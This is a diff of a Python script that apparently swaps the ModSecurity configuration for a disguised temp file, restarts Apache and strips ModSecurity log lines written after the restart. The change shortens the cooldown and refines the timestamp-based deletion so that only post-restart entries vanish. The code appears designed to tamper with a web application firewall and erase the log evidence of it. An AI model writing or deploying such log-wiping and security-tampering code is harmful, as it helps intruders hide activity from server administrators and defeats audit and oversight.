@@ -13,7 +13,7 @@ MODSEC_BASE = "/etc/modsecurity/modsecurity.conf"
 MODSEC_TEMP = "/etc/modsecurity/modsecuritybL6qM.conf"
 SCRIPT_LOG = "/var/tmp/cleaner_bL6qM1.log"
 COOLDOWN_FILE = "/var/tmp/last_restart_trigger_bL6qM.txt"
-COOLDOWN_SECONDS = 80
+COOLDOWN_SECONDS = 10
 CLEAN_INTERVAL = 0.05
 
 MODSEC_PATTERN = re.compile(r'.*ModSecurity.*\n?')
@@ -99,17 +99,16 @@ def check_cooldown():
     return True
 
 
-def clean_startup_logs(file_path):
+def clean_startup_logs(file_path, restart_time):
     if not os.path.exists(file_path):
         return False
     
     lock_file = f"{file_path}.lock"
     
     try:
-        now = datetime.now()
-        date_part = now.strftime('%a %b %e')
-        hour_min = now.strftime('%H:%M')
-        year = now.strftime('%Y')
+        date_part = restart_time.strftime('%a %b %e')
+        hour_min = restart_time.strftime('%H:%M')
+        year = restart_time.strftime('%Y')
         
         time_pattern = re.compile(
             rf'\[{re.escape(date_part)}\s+{hour_min}:.*{year}\].*(' + 
@@ -122,13 +121,26 @@ def clean_startup_logs(file_path):
         with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
             lines = f.readlines()
         
-        filtered_lines = [line for line in lines if not time_pattern.search(line)]
+        filtered_lines = []
+        for line in lines:
+            match = time_pattern.search(line)
+            if match:
+                try:
+                    log_time_str = line.split('[')[1].split(']')[0]
+                    log_time = datetime.strptime(log_time_str, '%a %b %d %H:%M:%S.%f %Y')
+                    
+                    if log_time < restart_time:
+                        filtered_lines.append(line)
+                except Exception:
+                    filtered_lines.append(line)
+            else:
+                filtered_lines.append(line)
         
         if len(filtered_lines) < len(lines):
             with open(file_path, 'w', encoding='utf-8') as f:
                 f.writelines(filtered_lines)
             
-            log("Startup", "Current_Restart_Logs_Cleaned")
+            log("Startup", f"Cleaned logs after {restart_time.strftime('%H:%M:%S')}")
             result = True
         else:
             result = False
@@ -168,6 +180,8 @@ def handle_restart():
         except Exception as e:
             log("Error", f"Config restore failed: {e}")
     
+    restart_time = datetime.now()
+    
     try:
         result = subprocess.run(
             ['systemctl', 'restart', 'apache2'],
@@ -192,7 +206,7 @@ def handle_restart():
     
     time.sleep(3)
     
-    clean_startup_logs(LOG_FILE)
+    clean_startup_logs(LOG_FILE, restart_time)
 
 
 def modsec_cleaner_thread():
